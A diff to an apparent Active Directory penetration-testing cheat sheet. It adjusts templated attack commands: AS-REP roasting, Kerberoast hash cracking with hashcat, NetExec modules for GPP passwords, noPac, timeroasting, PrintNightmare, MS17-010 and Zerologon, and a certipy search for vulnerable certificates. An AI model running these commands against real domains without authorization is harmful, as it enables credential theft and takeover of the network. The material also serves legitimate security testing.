@@ -22,17 +22,17 @@ GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>' -k -no-pa
 
 nxc smb <ip> --use-kcache --shares
 
-nxc smb <ip> --use-kcache -M enum_av -M enum_ca -M enum_cve -M gpp_privileges -M ioxidresolver -M sccm-recon6 -M smbghost -M webdav -M gpp_autologin -M gpp_password
+nxc smb <ip> --use-kcache -M enum_av -M enum_ca -M enum_cve -M gpp_privileges -M ioxidresolver -M sccm-recon6 -M smbghost -M spooler -M webdav -M gpp_autologin -M gpp_password
 
 nxc smb <ip> -u '<user>' -p '<password>' -M nopac -M remove-mic
 
-hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet
+[ -s hashes.asreproast ] && timeout 20 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet
 
-hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet
+[ -s hashes.kerberoast ] && timeout 20 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet
 
 nxc smb <ip> -u '<user>' -p '<password>' -M timeroast
 
-powerview <domain>/'<user>'@<dc_fqdn> -k --no-pass
+powerview <domain>/'<user>:<password>'@<dc_fqdn> --no-cache
 ```
 
 ## AD additional user all in one
@@ -52,9 +52,4 @@ certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -
 nxc smb <ip> -u '<user>' -p '<password>' -M printnightmare
 
 nxc smb <ip> -u '<user>' -p '<password>' -M ms17-010 -M zerologon
-```
-
-## AD admin checks
-```
-
 ```
